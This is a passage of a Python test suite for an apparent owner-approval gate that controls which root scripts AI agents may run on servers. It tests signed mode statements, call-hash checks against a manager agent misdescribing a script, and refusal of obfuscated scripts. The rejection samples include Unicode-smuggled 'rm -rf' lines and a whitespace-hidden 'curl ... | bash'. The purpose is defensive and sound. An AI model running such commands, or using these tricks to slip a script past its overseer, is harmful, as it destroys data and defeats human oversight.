        for bad, why in ((self.mode_of("web-1", "full", t, fleet="another-fleet"), "not of this fleet"),
                         (self.mode_of("web-1", "full", t + 3600), "in the future"),
                         (self.mode_of("hub", "full", t), "no agent holds hub at Fix")):
            with self.subTest(bad=bad):
                status, answer = self.set_mode(bad, host=json.loads(bad)["host"])
                self.assertEqual(status, 409, answer)
                self.assertIn(why, answer["error"])
        self.assertEqual(self.served(), [])
        self.assertEqual(self.request("/ui/door/mode", {"request_id": str(uuid.uuid4()), "db": "test-generation",
                                                        "host": "web-1", "statement": full,
                                                        "signature": "c2lnbmF0dXJl"}, source=OTHER)[0], 403)
        # Full access, then Auto: each is served to the door as it came, the newest first, and /ui/servers gives the
        # newest. The hub keeps the ones before it too: it cannot tell a signed statement from one that the door
        # refuses, so no statement is the only one that the door gets.
        status, answer = self.set_mode(full)
        self.assertEqual((status, {k: answer[k] for k in ("host", "mode", "at", "changed")}),
                         (200, {"host": "web-1", "mode": "full", "at": t - 100, "changed": True}), answer)
        self.assertEqual([m for m in self.request("/door/approvals", source=DOOR)[1]["modes"]
                          if '"web-1"' in m["statement"]], [{"statement": full, "signature": "c2lnbmF0dXJl"}])
        self.assertEqual((self.app_server()["mode"], self.app_server()["mode_at"]), ("full", t - 100))
        self.assertEqual(self.set_mode(full)[1]["changed"], False)              # the same statement again
        status, answer = self.set_mode(auto, signature="YXV0by1zaWduYXR1cmU=")
        self.assertEqual((status, answer.get("mode"), answer.get("changed")), (200, "auto", True), answer)
        self.assertEqual(self.served(), [auto, full])
        self.assertEqual((self.app_server()["mode"], self.app_server()["mode_at"]), ("auto", t - 50))
        # the door takes only a newer statement, so the hub takes no other: not the Full access from before, not
        # one of the Auto's own second, and it says the time that a new one must pass
        for old in (full, self.mode_of("web-1", "full", t - 50), self.mode_of("web-1", "auto", t - 51)):
            with self.subTest(old=old):
                status, answer = self.set_mode(old)
                self.assertEqual((status, answer.get("at")), (409, t - 50), answer)
                self.assertIn("the door takes only a newer one", answer["error"])
        self.assertEqual(self.served(), [auto, full])
        # the door's card signs Full access later: the newest of the two ways is served, and then the row's Auto
        nid = int(hub.t_raise_needs_you("manager", run_card()).split("N-")[1].split(".")[0])
        card = self.mode_of("web-1", "full", t - 20)
        self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=1, statement=card, signature="Y2FyZA==")[0], 200)
        self.assertEqual(self.served(), [card, auto, full])
        self.assertEqual((self.app_server()["mode"], self.app_server()["mode_at"]), ("full", t - 20))
        self.assertEqual(self.set_mode(self.mode_of("web-1", "auto", t - 20))[0], 409)     # the card's own second
        back = self.mode_of("web-1", "auto", t - 10)
        self.assertEqual(self.set_mode(back)[0], 200)
        self.assertEqual(self.served(), [back, card, auto, full])
        # a card's Full access that is not newer than the row's Auto, or of another fleet: the door would take
        # neither, so neither takes the place of the Auto that the hub serves and shows
        nid = int(hub.t_raise_needs_you("manager", run_card(script="id\n")).split("N-")[1].split(".")[0])
        for bad, why in ((self.mode_of("web-1", "full", t - 10), "the door takes only a newer one"),
                         (self.mode_of("web-1", "full", t - 80), "the door takes only a newer one"),
                         (self.mode_of("web-1", "full", t - 9, fleet="another-fleet"), "not of this fleet")):
            status, answer = self.owner(f"/ui/needs/{nid}", choice=1, statement=bad, signature="Y2FyZA==")
            self.assertEqual(status, 400, answer)
            self.assertIn(why, answer["error"])
        self.assertEqual(self.served(), [back, card, auto, full])
        self.assertEqual(self.app_server()["mode"], "auto")
        self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=2)[0], 200)     # No: the next card is web-1's only one
        # the agent loses the server: no Full access is set, and an Auto still is, so Full access can always end
        again = self.mode_of("web-1", "full", t - 5)
        self.assertEqual(self.set_mode(again)[0], 200)
        self.grant(agent="vps", server="web-1", level=None)
        self.assertEqual(self.set_mode(self.mode_of("web-1", "full", t - 4))[0], 409)
        last = self.mode_of("web-1", "auto", t - 3)
        self.assertEqual(self.set_mode(last)[0], 200)
        # the door gets that Auto though no agent holds the server now: it must have it before one holds it again.
        # And the hub serves the newest five of a server, from its row and from its cards.
        self.assertEqual(self.served(), [last, again, back, card, auto])
        self.assertEqual(len(hub.door_mode_rows("web-1")), hub.DOOR_MODES_KEPT)
        self.assertEqual(self.request("/door/approvals", source=OWNER)[0], 403)
        # the door reads a bounded list: the servers that an agent holds come first, whatever their names
        self.grant(agent="vps", server="web-1", level="read")
        for name in ("aa-1", "zz-1"):
            hub.kv_set(f"door_mode:{name}", json.dumps({"statement": self.mode_of(name, "auto", t), "received": t,
                                                         "signature": "c2lnbmF0dXJl"}))
        hosts = [json.loads(m["statement"])["host"] for m in self.request("/door/approvals", source=DOOR)[1]["modes"]]
        # the newest of every server before the second of any: the held server first in each round
        self.assertEqual(hosts, ["web-1", "aa-1", "db-9", "zz-1"] + ["web-1"] * 4)
        # A statement in the right form that the door will refuse (no signature of the owner key) does not take the
        # place of the signed ones before it: the door still gets them, and takes the newest that it can check.
        self.grant(agent="vps", server="web-1", level="fix")
        forged = self.mode_of("web-1", "full", t - 2)
        self.assertEqual(self.set_mode(forged, signature="bm90LXNpZ25lZA==")[0], 200)
        self.assertEqual(self.served()[:2], [forged, last])
        self.assertEqual(self.app_server()["mode"], "full")         # what was sent last; mode_door says what holds
        # A row that holds more than statements of this server (an older shape, something written by hand) loses
        # only that, and keeps its newest five by the statements' own times, whatever their order in the row.
        many = [{"statement": self.mode_of("zz-1", "auto", t - 60 + n), "signature": "c2lnbmF0dXJl", "received": t}
                for n in range(8)]
        hub.kv_set("door_mode:zz-1", json.dumps([{"x": 1}, 5, None] + many))
        newest = self.mode_of("zz-1", "auto", t - 1)
        self.assertEqual(self.set_mode(newest, host="zz-1")[0], 200)
        self.assertEqual([json.loads(r["statement"])["at"] for r in hub.door_mode_rows("zz-1")],
                         [t - 1, t - 53, t - 54, t - 55, t - 56])
        # the limit of names is for a new name only: a server whose Full access came from the door's card takes
        # its Auto from the row though the row is new
        with patch.object(hub, "DOOR_MODE_HOSTS", 1):
            self.assertEqual(self.set_mode(self.mode_of("new-9", "auto", t), host="new-9")[0], 409)
            self.grant(agent="vps", server="db-1", level="fix")
            nid = int(hub.t_raise_needs_you("manager", run_card(host="db-1")).split("N-")[1].split(".")[0])
            self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=1, statement=self.mode_of("db-1", "full", t - 9),
                                        signature="Y2FyZA==")[0], 200)
            self.assertEqual(hub.door_mode_rows("db-1"), [])
            self.assertEqual(self.set_mode(self.mode_of("db-1", "auto", t - 8), host="db-1")[0], 200)
            self.assertEqual(self.set_mode(self.mode_of("zz-1", "auto", t), host="zz-1")[0], 200)
        # the card's Full access takes no time from the future either
        self.grant(agent="vps", server="web-1", level="fix")
        nid = int(hub.t_raise_needs_you("manager", run_card(script="uptime\n")).split("N-")[1].split(".")[0])
        status, answer = self.owner(f"/ui/needs/{nid}", choice=1, statement=self.mode_of("web-1", "full", t + 3600),
                                    signature="Y2FyZA==")
        self.assertEqual(status, 400, answer)
        self.assertIn("in the future", answer["error"])

    def test_a_stored_statement_that_the_door_never_took_is_not_carried(self):
        """The review of 12 November 2026. A card of a hub release before version 1.125 could keep a Full access with
        a time from the future: the door did not take it, it stood before every later statement of the owner (the
        hub refused each as not newer, or as from the future), and the door would have taken it by itself when its
        time came. A statement from the future of its own arrival, of another fleet, or in a row that does not
        read, is none: nothing of it is served, shown, or in the way."""
        self.grant(agent="vps", server="web-1", level="fix")
        t = round(hub.now())
        nid = int(hub.t_raise_needs_you("manager", run_card()).split("N-")[1].split(".")[0])
        future = self.mode_of("web-1", "full", t + 86400)
        hub.q("UPDATE needs SET approval=?, answer='Full access on web-1', answered=? WHERE id=?",
              (json.dumps({"statement": future, "signature": "c2ln"}), t, nid))
        self.assertEqual(hub.door_modes_held(), {})
        self.assertEqual(self.request("/door/approvals", source=DOOR)[1]["modes"], [])
        self.assertEqual(self.app_server()["mode"], "auto")
        auto = self.mode_of("web-1", "auto", t)
        self.assertEqual(self.set_mode(auto)[0], 200)                   # it is in nobody's way
        self.assertEqual(self.request("/door/approvals", source=DOOR)[1]["modes"],
                         [{"statement": auto, "signature": "c2lnbmF0dXJl"}])
        with patch.object(hub, "now", lambda: t + 86400 + 10):          # and its time brings it back to nobody
            self.assertEqual(hub.door_modes_held()["web-1"]["statement"], auto)
        # rows that do not read, of another fleet, or with no time of arrival: skipped, and no read fails
        for n, value in enumerate(("text", "[" * 100000, "null", "5", json.dumps({"statement": 5}),
                                   json.dumps({"statement": self.mode_of("web-1", "full", t + 5), "signature": "c2ln"}),
                                   json.dumps({"statement": self.mode_of("web-1", "full", t + 5), "signature": "c2ln",
                                               "received": "now"}),
                                   json.dumps({"statement": self.mode_of("web-1", "full", t + 5, fleet="other"),
                                               "signature": "c2ln", "received": t}))):
            hub.kv_set(f"door_mode:other-{n}", value)
        for value in ("[1]", "5", "text", "[" * 100000, json.dumps({"modes": [1]}),
                      json.dumps({"modes": {"web-1": "full"}}), json.dumps({"modes": {"web-1": {"mode": ["full"]}}})):
            hub.kv_set("door_modes_said", value)
            self.assertIsNone(self.app_server()["mode_door"], value)
            hub.door_modes_said({"modes": {"web-1": {"mode": "auto", "at": t}}}, t)     # and the next read repairs it
            self.assertEqual(self.app_server()["mode_door"], "auto", value)
        self.assertEqual(hub.door_modes_held()["web-1"]["statement"], auto)
        self.assertEqual(self.request("/door/approvals", source=DOOR)[0], 200)

    def test_a_door_card_fits_the_call_of_its_hash_by_the_door_s_own_record(self):
        """The review of 12 November 2026: the owner's Mac computes the hash itself only on the door's card of a run.
        On every other card with a door_call it signs the hash that the hub gives, so a steered manager could ask
        "Delete the old test volume?" with the hash of a root script. The door writes the hash of each refused call
        in its record, which no agent writes, and the hub holds each card to it."""
        self.grant(agent="vps", server="web-1", level="fix")
        self.grant(agent="vps", server="db-1", level="fix")
        script = "rm -rf /srv/app/uploads\n"
        run, delete = hub.door_call_hash("web-1", "run", [], script.encode()), "d" * 64
        free = {"title": "Delete the old test volume?", "why": "It costs money each month.",
                "what_to_do": "Answer yes", "options": ["Yes, delete it", "No"]}
        card = {"title": "Run one root script on web-1?", "why": "Vps must clear the uploads folder of its app.",
                "what_to_do": "Answer Run it once, or Full access on web-1", "door_host": "web-1"}
        # A hash that the hub's copy of the record does not hold gets no card: a manager can compute a run's hash
        # with no refusal at all, and the hub's record was empty of hashes right after this release. The hub reads
        # the record at once.
        hub.DOOR["read_at"] = hub.now()
        for item in (dict(free, door_call=run), dict(card, door_call=run, door_script=script)):
            with self.assertRaisesRegex(hub.ToolError, "holds no refusal with this call hash"):
                hub.t_raise_needs_you("manager", item)
        self.assertEqual(hub.DOOR["read_at"], 0.0)
        # the record read: the hash of each refused line, of no other line, and of a line that the hub read before
        # it kept hashes when the door gives that line again (its last one, each minute)
        hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why) VALUES(1,1.0,'vps','web-1','run',"
              "'refused','refused','x')")
        answer = {"entries": [
            {"n": 1, "ts": 1.0, "caller": "vps", "target": "web-1", "action": "run", "kind": "refused",
             "outcome": "refused", "why": "x", "sha256": run},
            {"n": 2, "ts": 2.0, "caller": "vps", "target": "hetzner:one", "action": "volume-delete", "kind": "refused",
             "outcome": "refused", "why": "x", "sha256": delete},
            {"n": 3, "ts": 3.0, "caller": "vps", "target": "web-1", "action": "restart", "kind": "rule",
             "outcome": "done", "why": "x", "sha256": "c" * 64},
            {"n": 4, "ts": 4.0, "caller": "vps", "target": "web-1", "action": "run", "kind": "refused",
             "outcome": "refused", "why": "x", "sha256": "E" * 64},
            {"n": 5, "ts": 5.0, "caller": "vps", "target": "web-1", "action": "run", "kind": "refused",
             "outcome": "refused", "why": "x", "sha256": 5}], "last": 5}
        (self.root / "door.json").write_text(json.dumps({"token": "token-secret", "record": "record-secret"}))
        hub.CFG["door_secrets"] = str(self.root / "door.json")
        self.addCleanup(hub.CFG.pop, "door_secrets", None)
        with patch.object(hub, "door_call", lambda conf, method, path, secret, body=None: (200, answer)):
            self.assertEqual(hub.door_sweep(t0=hub.now()), 5)
        self.assertEqual([r["call"] for r in hub.q("SELECT call FROM door_record ORDER BY n")],
                         [run, delete, None, None, None])
        for bad, why in ((dict(free, door_call=run), "is of a root script on web-1"),
                         (dict(free, door_call=run, replaces=None), "is of a root script on web-1"),
                         (dict(card, door_call=run, door_script=script, door_host="db-1",
                               title="Run one root script on db-1?"), "is of a root script on web-1"),
                         (dict(card, door_call=delete, door_script=script), "which is no root script of a server"),
                         (dict(card, door_call=run), "needs door_script"),
                         (dict(card, door_call=run, door_script=script, title="Run a small script on web-1?"),
                          "word for word"),
                         (dict(free, door_call="c" * 64), "holds no refusal with this call hash")):
            with self.subTest(bad=bad), self.assertRaisesRegex(hub.ToolError, why):
                hub.t_raise_needs_you("manager", bad)
        self.assertEqual(hub.q1("SELECT COUNT(*) n FROM needs")["n"], 0)
        said = hub.t_raise_needs_you("manager", dict(card, door_call=run, door_script=script))
        self.assertIn("Raised N-", said)
        self.assertIn("Raised N-", hub.t_raise_needs_you("manager", dict(free, door_call=delete)))
        # An item from before this version: a run's hash under free words, and a door card whose script is the
        # manager's words. His yes to either is refused, signed or not, and No is as before.
        hub.q("INSERT INTO needs(id,title,why,todo,raised,by,options,door_call) VALUES(900,'Delete the old test volume?',"
              "'It costs money.','Answer yes',1,'manager',?,?)", (json.dumps(["Yes, delete it", "No"]), run))
        hub.q("INSERT INTO needs(id,title,why,todo,raised,by,options,door_call,door_host,details) VALUES(901,"
              "'Run one root script on web-1?','It lists a folder.','Answer',1,'manager',?,?,'web-1','ls -la /srv/app')",
              (json.dumps(["Run it once", "Full access on web-1", "No"]), run))
        for nid in (900, 901):
            yes = json.dumps({"v": 1, "kind": "door-call", "fleet": hub.fleet_id(), "need": nid, "call": run,
                              "at": round(hub.now())},
                             sort_keys=True, separators=(",", ":"))
            for more in ({}, {"statement": yes, "signature": "c2ln"}):
                status, answer = self.owner(f"/ui/needs/{nid}", choice=0, **more)
                self.assertEqual(status, 409, answer)
                self.assertIn("does not show the script that its yes would run as root on web-1", answer["error"])
            self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=1 if nid == 900 else 2)[0], 200)
        self.assertEqual(self.request("/door/approvals", source=DOOR)[1]["approvals"], [])
        # an older item whose hash the record does not hold: the hub cannot tell what its yes lets through
        hub.q("INSERT INTO needs(id,title,why,todo,raised,by,options,door_call) VALUES(902,'Delete the old test volume?',"
              "'It costs money.','Answer yes',1,'manager',?,?)", (json.dumps(["Yes, delete it", "No"]), "9" * 64))
        yes = json.dumps({"v": 1, "kind": "door-call", "fleet": hub.fleet_id(), "need": 902, "call": "9" * 64,
                          "at": round(hub.now())},
                         sort_keys=True, separators=(",", ":"))
        status, answer = self.owner("/ui/needs/902", choice=0, statement=yes, signature="c2ln")
        self.assertEqual(status, 409, answer)
        self.assertIn("The door's record does not hold the call of this item", answer["error"])
        self.assertEqual(self.request("/door/approvals", source=DOOR)[1]["approvals"], [])
        # a fleet with no door has no refusal of a door: no hash gets a card, and none waits for a door that comes
        team = self.origin_team()
        del team["door"]
        self.write_team(team)
        for item in (dict(free, door_call=delete), dict(free, door_call="9" * 64)):
            with self.assertRaisesRegex(hub.ToolError, "This fleet has no door"):
                hub.t_raise_needs_you("manager", item)

    def test_the_servers_page_gives_the_door_s_own_word_of_each_mode(self):
        """The hub cannot check the owner's signature, so the mode of its newest statement is not proof that the door
        took it. The door says what it keeps with each record read (door.modes_said), and /ui/servers gives that
        beside the hub's own: mode_door."""
        self.grant(agent="vps", server="web-1", level="fix")
        t = round(hub.now())
        self.assertEqual(self.set_mode(self.mode_of("web-1", "auto", t - 5))[0], 200)
        self.assertIsNone(self.app_server()["mode_door"])
        hub.door_modes_said({"entries": []}, t)                     # a door of an older release says nothing
        self.assertIsNone(hub.kv_get("door_modes_said"))
        hub.door_modes_said({"modes": {"web-1": {"mode": "full", "at": t - 100}, "db-1": {"mode": "auto", "at": None},
                                       "Bad Name": {"mode": "full"}, "web-3": {"mode": "ended"}, "web-4": "full"}}, t)
        self.assertEqual(json.loads(hub.kv_get("door_modes_said")),
                         {"at": t, "modes": {"web-1": {"mode": "full", "at": t - 100},
                                             "db-1": {"mode": "auto", "at": None}}})
        server = self.app_server()
        self.assertEqual((server["mode"], server["mode_at"], server["mode_door"]), ("auto", t - 5, "full"))
        hub.door_modes_said({"modes": {"web-1": {"mode": "auto", "at": t - 5}}}, t + 60)
        self.assertEqual(self.app_server()["mode_door"], "auto")
        self.assertEqual(json.loads(hub.kv_get("door_modes_said"))["at"], t + 60)
        hub.door_modes_said({"modes": {"web-1": {"mode": "auto", "at": t - 5}}}, t + 120)   # the same: no write
        self.assertEqual(json.loads(hub.kv_get("door_modes_said"))["at"], t + 60)
        # while the door does not answer the hub's read of its record, its last word is no word
        with patch.dict(hub.DOOR, error=t + 180):
            self.assertIsNone(self.app_server()["mode_door"])
        self.assertEqual(self.app_server()["mode_door"], "auto")

    def test_a_door_card_carries_the_script_that_the_owner_s_mac_hashes(self):
        """Review point 5.6 of 11 November 2026: the owner signed a hash, and the card's script was the manager's
        words. raise_needs_you door_script is the script itself: the hub checks that it is the script of door_call,
        the card shows it and nothing else under Script, and the owner's Mac computes the hash again from what it
        shows. The hub's hash is the door's (test_door.CALL_HASHES)."""
        import test_door
        for line in test_door.CALL_HASHES:
            target, action, args, content, sha = json.loads(line)
            self.assertEqual(hub.door_call_hash(target, action, args, content.encode()), sha)
        self.grant(agent="vps", server="web-1", level="fix")
        script = "#!/bin/bash\nset -e\ncp -a /srv/app/uploads /root/uploads-copy\n"

        def hashed(text, host="web-1"):
            """The hash of this script as a run on the host, with its line in the door's record."""
            return refusal(hub.door_call_hash(host, "run", [], text.encode()), host, "run")
        call = hashed(script)
        base = {"title": "Run one root script on web-1?", "why": "Vps must copy the uploads folder of its app.",
                "what_to_do": "Answer Run it once, or Full access on web-1", "door_call": call, "door_host": "web-1"}

        def item(said):
            """The card that was raised, as /ui/state serves it. Then it is withdrawn: the next card of web-1 is no
            second open card of one job (test_one_job_on_one_server_is_one_door_card)."""
            nid = int(said.split("N-")[1].split(".")[0])
            got = hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
            hub.t_withdraw_need("manager", {"need": f"N-{nid}", "why": "The test raises the next card."})
            return got
        said = hub.t_raise_needs_you("manager", dict(base, door_script=script))
        self.assertNotIn("carries no door_script", said)
        got = item(said)
        self.assertEqual((got["door_script"], got["details"]), (script, "```\n" + script + "```"))
        # the script as an agent's words carry it: without its last line feed, or with one that the file has not
        got = item(hub.t_raise_needs_you("manager", dict(base, door_script=script[:-1])))
        self.assertEqual((got["door_script"], got["details"]), (script, "```\n" + script + "```"))
        # or as a read of messages gives it, each line two spaces in (hub.stand_in): the card holds the script itself
        got = item(hub.t_raise_needs_you("manager", dict(base, door_script=hub.stand_in(script))))
        self.assertEqual((got["door_script"], got["details"]), (script, "```\n" + script + "```"))
        bare = hashed("id")
        got = item(hub.t_raise_needs_you("manager", dict(base, door_call=bare, door_script="id\n")))
        self.assertEqual((got["door_script"], got["details"]), ("id", "```\nid\n```"))
        for bad, why in (({"door_script": script + "id\n"}, "not the script of door_call on web-1"),
                         ({"door_script": script.replace("uploads-copy", "uploads-c\u043epy")}, "not the script of"),
                         ({"door_script": script, "door_call": hashed("uptime\n")},
                          "not the script of door_call on web-1"),
                         ({"door_script": script, "details": "It copies a folder."}, "has no details"),
                         ({"door_script": script, "title": "Run a small script on web-1?"}, "word for word"),
                         ({"door_script": script, "door_host": None}, "is of a root script on web-1"),
                         ({"door_script": 5}, "as text"), ({"door_script": "  \n"}, "as text")):
            with self.subTest(bad=bad), self.assertRaisesRegex(hub.ToolError, why):
                hub.t_raise_needs_you("manager", dict(base, **bad))
        # a script is printable ASCII and line feeds: each of these drew one thing on the card and ran another
        # in the review of 12 November 2026, or can
        for text, why in (("id\r\n", "U\\+000D"), ("echo a\u202eb\n", "U\\+202E"), ("echo a\u200bb\n", "U\\+200B"),
                          ("rm -rf /srv/app\u00a0/\n", "U\\+00A0"), ("echo \x1b[2K\n", "U\\+001B"),
                          ("echo a\x00b\n", "U\\+0000"), ("id \x7f\n", "U\\+007F"),
                          ("cat > /root/howto.txt <\u034f<EOF\nrm -rf /srv/app/uploads\nEOF\n", "U\\+034F"),
                          ("echo nothing to do; exit\u034f 0\nrm -rf /srv/app/uploads\n", "U\\+034F"),
                          ("\u2800# note; rm -rf /srv/app\n", "U\\+2800"), ("mv /srv/\u05d0 1 2\n", "U\\+05D0"),
                          ("echo \u02bcdone; rm -rf /srv/app\u02bc\n", "U\\+02BC"), ("echo x\ufe0f\n", "U\\+FE0F"),
                          ("echo one\n\u1fef\u1fef\u1fef\nrm -rf /srv/data\n", "U\\+1FEF"),
                          ("echo \u3164\n", "U\\+3164"), ("echo caf\u00e9\n", "U\\+00E9"),
                          ("echo \U0001f600\n", "U\\+1F600"), ("id\u037e id\n", "U\\+037E"),
                          ("cat <<E\n```\nE\n", "starts with ```"), ("  ```sh\nid\n", "starts with ```"),
                          ("   ```\nid\n", "starts with ```"), ("#" * 4001 + "\n", "at most 4000 characters"),
                          # a text that he cannot read on the card: a packed line, base64 or hex, a blob in short lines
                          ("echo " + "x" * 100 + " " + "y" * 95 + "\n", "more than 200 characters"),
                          ("echo " + "A" * 121 + "\n", "a run of more than 120 characters with no space"),
                          (("abcdefghij" * 10 + "\n") * 20 + "z\n", "more than 2000 characters on lines with no space"),
                          # a blob cut into chunks of 99 with a space between them (security review of 21 November)
                          (("A" * 99 + " " + "B" * 99 + "\n") * 11, "encoded text \\(runs of more than 64 characters"),
                          ("echo " + "x" * 65 + "\n" + ("echo " + "x" * 100 + "\n") * 20, "runs of more than 64"),
                          # and into chunks of 64 or less, in hex or in base64 (security review, round 2)
                          ((" ".join(["0123456789abcdef" * 4] * 3) + "\n") * 11, "parts of 16 or more in hex"),
                          (("printf %s " + " ".join(["Ab3" * 20] * 3) + "\n") * 12, "in hex or in base64"),
                          (("x " + " ".join(["aB3x" * 4] * 11) + "\n") * 12, "in hex or in base64"),
                          # with a 0x before the hex, and in base32's small letters and digits (round 3)
                          (("printf %s " + " ".join(["0x" + "deadbeef" * 7] * 3) + "\n") * 12, "in hex or in base64"),
                          (("x " + " ".join(["a2b3" * 15] * 3) + "\n") * 12, "in hex or in base64"),
                          # hex with no digit: four fifths hex is enough
                          (("x " + " ".join(["deadbeef" * 7] * 3) + "\n") * 12, "in hex or in base64"),
                          # a space after a heredoc's end line ends nothing, and the next lines are its text
                          ("cat > /etc/acme.conf <<EOF\nkey=value\nEOF \nrm -rf /srv/acme\nEOF\n", "ends in a space"),
                          ("id \n", "ends in a space"),
                          # a tab is drawn to a tab stop: as no gap at all, or as a new row
                          ("x " + "x" * 48 + "\tyyy\nz\n", "U\\+0009"), ("if true; then\n\tid\nfi\n", "U\\+0009"),
                          ("systemctl restart nginx" + " " * 600 + "; curl -s https://example.com/x | bash\n", "more than 32 spaces"),
                          ("id" + " " * 33 + "x\n", "more than 32 spaces"), (" " * 33 + "id\n", "more than 32 spaces"),
                          ("id\n" + "\n" * 3000 + "rm -rf /srv\n", "in 200 lines now"),
                          ("id\n\n\n\nrm -rf /srv/app\n", "blank lines"), ("id\n \n   \n  \nid\n", "blank lines"),
                          ("\n\n\nid\n", "blank lines"), ("id\n" + "#\n" * 200, "in 200 lines now"),
                          ("id\n" + ":\n" * 1000 + "id\n", "in 200 lines now")):
            with self.subTest(text=text), self.assertRaisesRegex(hub.ToolError, why):
                hub.t_raise_needs_you("manager", dict(base, door_script=text, door_call=hashed(text)))
        with self.assertRaisesRegex(hub.ToolError, "half of a character"):
            hub.t_raise_needs_you("manager", dict(base, door_script="echo \ud83d\n"))
        # code in the card's own words would stand beside the script as a second script
        for words in ({"why": "It restarts the web server:\n```\nsystemctl restart nginx\n```"},
                      {"what_to_do": "Run `id` first"}):
            with self.subTest(words=words), self.assertRaisesRegex(hub.ToolError, "hold no backtick"):
                hub.t_raise_needs_you("manager", dict(base, door_script=script, **words))
        # what a script may hold: two blank lines, a gap of 32 spaces, lines of Markdown, which the card must not
        # draw, 4000 characters, 200 lines, a line of 200 characters, a run of 120 with no space, 2000 characters on
        # lines with no space, 2000 in runs of more than 64 with no space and in parts that read as encoded text (30
        # checksums), and any number of runs of 64 that read as words or paths
        for wide in ("    cp 'a b' /srv/*/_cache_/*  # **all** of `it`\n- [x](y)\n# title\n\n\n> quote\n",
                     "id" + " " * 32 + "# why\n", ("echo " + "x" * 44 + " " + "y" * 49 + "\n") * 40, "id\n" * 200,
                     "id\n" * 199 + "id", ("echo " + "x" * 100 + "\n") * 20, ("x" * 64 + " " + "y" * 64 + "\n") * 30,
                     ("echo " + "0123456789abcdef" * 4 + "  /root/job.sh | sha256sum -c\n") * 30,
                     "cp /usr/local/share/acme/templates/default.conf /etc/acme/conf.d/default.conf\n" * 40,
                     "echo " + "x" * 100 + " " + "y" * 94 + "\n", "echo " + "A" * 120 + "\n",
                     ("abcdefghij" * 10 + "\n") * 20):
            got = item(hub.t_raise_needs_you("manager", dict(base, door_script=wide, door_call=hashed(wide))))
            self.assertEqual((got["door_script"], got["details"]),
                             (wide, "```\n" + wide + ("" if wide.endswith("\n") else "\n") + "```"))
        # The bounds in force. With no Mac that says long=1 they are 4000 characters in 200 lines, which every Mac
        # signs; the refusal names them and says that one job is one card. Bug: a card that his Mac cannot sign, or
        # a long job cut into several cards.
        step = "echo one step of the acme worker setup, " + "x" * 55 + "\n"
        job, longest = step * 137, ("echo " + "y" * 44 + " " + "y" * 49 + "\n") * 160   # 13,152 and 16,000
        self.assertEqual((len(job), len(longest)), (13152, 16000))
        for text, why in ((job, "at most 4000 characters in 200 lines now"),
                          ("id\n" * 201, "at most 4000 characters in 200 lines now")):
            with self.subTest(text=text[:20]), self.assertRaises(hub.ToolError) as refused:
                hub.t_raise_needs_you("manager", dict(base, door_script=text, door_call=hashed(text)))
            for words in (why, "One job is one card: never send it as several shorter scripts", "Full access",
                          "`ops web-1 file`", "outputs/T-<id>/",
                          'exec 3</root/job.sh; echo "<sha256>  /dev/fd/3" | sha256sum -c && bash /dev/fd/3'):
                self.assertIn(words, str(refused.exception))
        # A Mac of this release says long=1 on its reads of GET /ui/door: then 16,000 characters in 600 lines.
        self.assertEqual(self.request("/ui/door?db=test-generation&long=1", source=OWNER)[0], 200)
        self.assertEqual(hub.door_script_bounds(), (16000, 600))
        for text in (job, longest, "id\n" * 600):
            got = item(hub.t_raise_needs_you("manager", dict(base, door_script=text, door_call=hashed(text))))
            self.assertEqual(got["door_script"], text)
        for text, why in ((longest + "x", "at most 16000 characters in 600 lines now, .* This one has 16001 "
                                          "characters in 161 lines"),
                          ("id\n" * 601, "at most 16000 characters in 600 lines now, .* This one has 1803 characters "
                                         "in 601 lines")):
            with self.subTest(text=text[:20]), self.assertRaisesRegex(hub.ToolError, why):
                hub.t_raise_needs_you("manager", dict(base, door_script=text, door_call=hashed(text)))
        # A read without the word is an older Mac's, which signs only the short bounds: they hold again.
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[0], 200)
        self.assertIsNone(hub.kv_get("door_long_script"))
        with self.assertRaisesRegex(hub.ToolError, "at most 4000 characters in 200 lines now"):
            hub.t_raise_needs_you("manager", dict(base, door_script=job, door_call=hashed(job)))
        # a server with a long name: the title is the hub's own words, however long the name is
        long_name = "db-" + "a" * 50
        self.grant(agent="vps", server=long_name, level="fix")
        got = item(hub.t_raise_needs_you("manager", dict(
            base, title=f"Run one root script on {long_name}?", door_host=long_name, door_script=script,
            door_call=hashed(script, long_name))))
        self.assertEqual((got["door_host"], got["door_script"]), (long_name, script))
        # the door's card always carries its script: the manager's own words are no script
        with self.assertRaisesRegex(hub.ToolError, "An item with a door_host needs door_script"):
            hub.t_raise_needs_you("manager", dict(base, details="cp -a /srv/app/uploads /root/uploads-copy"))

    def test_the_app_s_numbers_of_a_door_script_are_the_hub_s(self):
        """The owner's Mac and iPhone check a door card's script by DoorCall.swift (DoorCall.checked) before they sign
        Run it once, with the long bounds of the Mac that says long=1. Bug: the hub takes a card that his Mac
        refuses, so he cannot answer it with Run it once, or refuses one that his Mac signs."""
        import pathlib
        import re
        app = pathlib.Path(hub.__file__).parent / "app"
        if not app.is_dir():
            self.skipTest("the apps' folder app/ is not in this tree (the published repository has none)")
        text = (app / "Sources" / "FleetCore" / "DoorCall.swift").read_text()
        numbers = dict(re.findall(r"public static let (\w+) = ([0-9_]+)\n", text))
        self.assertEqual({name: int(numbers[name].replace("_", "")) for name in (
            "scriptCharacters", "scriptLines", "lineCharacters", "runCharacters", "denseCharacters", "gapSpaces",
            "blankLines", "blobCharacters", "codedCharacters")},
            {"scriptCharacters": hub.DOOR_SCRIPT_CHARS_LONG, "scriptLines": hub.DOOR_SCRIPT_LINES_LONG,
             "lineCharacters": hub.DOOR_SCRIPT_LINE, "runCharacters": hub.DOOR_SCRIPT_RUN,
             "denseCharacters": hub.DOOR_SCRIPT_DENSE, "gapSpaces": hub.DOOR_SCRIPT_GAP,
             "blankLines": hub.DOOR_SCRIPT_BLANK, "blobCharacters": hub.DOOR_SCRIPT_BLOB,
             "codedCharacters": hub.DOOR_SCRIPT_CODED})

    def test_only_a_grant_that_the_owner_signed_for_the_door_is_sealed_and_kept(self):
        """Lane B's V1: the central vault seals a secret for the door only when the owner signed a grant to the
        machine "door". A copy that waited too long, or of a grant that ended, goes; the door reads what it may keep."""
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        status = {"central": True, "pins": {"door": {"recipient": "age1" + "q" * 58}}, "grants": [], "pool": []}
        asked = []

        def call(op, fields=None):
            asked.append((op, fields))
            return {"ok": True}
